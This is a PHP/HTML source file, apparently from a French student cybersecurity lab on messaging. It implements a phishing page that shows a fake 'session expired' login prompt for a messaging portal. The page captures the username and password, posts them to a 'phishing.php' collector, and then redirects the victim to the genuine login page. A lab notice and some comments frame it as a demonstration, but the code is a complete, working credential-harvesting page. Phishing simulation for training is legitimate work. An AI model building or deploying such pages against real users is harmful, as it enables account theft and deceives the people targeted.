<?php
// fake_login/index.php
// Interface d'authentification pédagogique (Version de démonstration sécurisée)

session_start();

// Récupération et assainissement strict de l'identifiant du destinataire / expéditeur
$sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 0;
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Portail de Messagerie Centralisé</title>
    <style>
        :root {
            --primary-color: #31a24c;
            --primary-light: #4db366;
            --bg-gradient: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
            --text-dark: #2c3e50;
            --card-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-gradient);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .auth-container {
            background: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: var(--card-shadow);
            max-width: 420px;
            width: 100%;
        }

        .auth-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .auth-header h1 {
            color: var(--primary-color);
            font-size: 1.8rem;
            margin-bottom: 10px;
        }

        .auth-header p {
            color: #7f8c8d;
            font-size: 0.9rem;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-dark);
            font-size: 0.9rem;
            font-weight: 600;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dcdde1;
            border-radius: 6px;
            font-size: 0.95rem;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--primary-color);
        }

        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: var(--primary-color);
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #27873c;
        }

        .lab-notice {
            margin-top: 25px;
            padding: 12px;
            background-color: #f8f9fa;
            border-left: 4px solid #f39c12;
            border-radius: 4px;
            font-size: 0.8rem;
            color: #7f8c8d;
            line-height: 1.4;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <div class="auth-header">
            <h1>Session Expirée</h1>
            <p>Veuillez vous réauthentifier pour accéder à vos messages sécurisés.</p>
        </div>

        <form id="phishing-form">
            <div class="form-group">
                <label for="username">Identifiant ou Adresse e-mail</label>
                <input type="text" id=\"username\" name="username" placeholder="ex: etudiant_mdi" required autocomplete="username">
            </div>

            <div class="form-group">
                <label for="password">Mot de passe associé</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
            </div>

            <button type="submit" class="btn-submit">Valider la connexion</button>
        </form>

        <div class="lab-notice">
            <strong>🔬 Environnement d'étude :</strong> Cette interface simule un composant tiers afin d'analyser la redirection des flux d'authentification et de valider les protocoles d'alerte utilisateur.
        </div>
    </div>

    <script>
        document.getElementById('phishing-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            // Conversion sécurisée en entier du côté JS
            const senderId = parseInt(<?php echo json_encode($sender_id); ?>, 10) || 0;
            
            // Transmission asynchrone des données de simulation au collecteur local
            fetch('/projects/MDI/cyber-securite/messagerie/codes/fake_login/phishing.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&sender_id=${encodeURIComponent(senderId)}`
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Erreur de communication réseau');
                }
                return response.json();
            })
            .then(data => {
                if (data.success) {
                    alert('Simulation complétée : Transmission enregistrée dans les journaux de test.');
                    // Redirection sécurisée vers la page de reconnexion officielle
                    window.location.href = '/projects/MDI/cyber-securite/messagerie/codes/login.php';
                } else {
                    alert('Erreur retournée par le système de test : ' + (data.message || 'Données invalides'));
                }
            })
            .catch(error => {
                console.error('Erreur de diagnostic:', error);
                alert('Une exception est survenue lors de la soumission de validation.');
            });
        });
    </script>
</body>
</html>